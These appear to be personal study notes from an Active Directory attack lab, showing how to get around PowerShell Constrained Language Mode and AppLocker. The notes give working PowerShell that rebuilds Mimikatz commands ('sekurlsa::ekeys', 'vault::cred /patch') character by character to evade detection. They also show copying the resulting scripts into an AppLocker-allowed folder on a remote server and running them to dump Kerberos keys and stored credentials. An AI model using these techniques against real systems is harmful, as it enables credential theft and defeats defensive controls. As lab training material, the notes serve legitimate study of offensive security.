View constrained language type
```powershell
$ExecutionContext.SessionState.LanguageMode
```

View Policy
```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

Default rules are to allow **Everyone** to access and run scripts from `C:\Program Files` and `C:\Windows`
![[Pasted image 20250506212949.png]]

In the `Constrained Language Mode`, we can't run scripts using dot sourcing (`. .\Invoke-Mimi.ps1`). So, we must modify `Invoke-Mimi.ps1 `to include the 
function call in the script itself and transfer the modified script (`Invoke-MimiEx.ps1`) to the target server.

Create `Invoke-MimiEx-keys.ps1`
- Create a copy of Invoke-Mimi.ps1 and rename it to `Invoke-MimiEx-keys.ps1`
- Open `Invoke-MimiEx-keys.ps1 `in PowerShell ISE (Right click on it and click Edit). 
- Add the below encoded value for "sekurlsa::ekeys" to the end of the file

```powershell
$8 = "s";
$c = "e";
$g = "k";
$t = "u";
$p = "r";
$n = "l";
$7 = "s";
$6 = "a";
$l = ":";
$2 = ":";
$z = "e";
$e = "k";
$0 = "e";
$s = "y";
$1 = "s";
$Pwn = $8 + $c + $g + $t + $p + $n + $7 + $6 + $l + $2 + $z + $e + $0 + $s + 
$1 ;
Invoke-Mimi -Command $Pwn
```

Same thing for Credential Vault
```powershell
$8 = "t"; $c = "o"; $g = "k"; $t = "e"; $p = "n"; $n = ":"; $7 = ":"; $6 = "e"; $l = "l"; $2 = "e"; $z = "v"; $e = "a"; $0 = "t"; $s = "e";
$cmd1 = $8 + $c + $g + $t + $p + $n + $7 + $6 + $l + $2 + $z + $e + $0 + $s;

$v1 = "v"; $v2 = "a"; $v3 = "u"; $v4 = "l"; $v5 = "t"; $v6 = ":"; $v7 = ":"; $v8 = "c"; $v9 = "r"; $v10 = "e"; $v11 = "d";
$v12 = " "; $v13 = "/"; $v14 = "p"; $v15 = "a"; $v16 = "t"; $v17 = "c"; $v18 = "h"; $v19 = '"';
$cmd2 = $v19 + $v1 + $v2 + $v3 + $v4 + $v5 + $v6 + $v7 + $v8 + $v9 + $v10 + $v11 + $v12 + $v13 + $v14 + $v15 + $v16 + $v17 + $v18 + $v19;

# Concatenate both commands into a single string
$Pwn = $cmd1 + " " + $cmd2

# Run it
Invoke-Mimi -Command $Pwn

```

Copy to machine and run
```powershell
Copy-Item C:\AD\Tools\Invoke-MimiEx-keys.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'

Copy-Item C:\AD\Tools\Invoke-MimiEx-vault.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'

.\Invoke-MimiEx-keys.ps1
.\Invoke-MimiEx-vault.ps1
```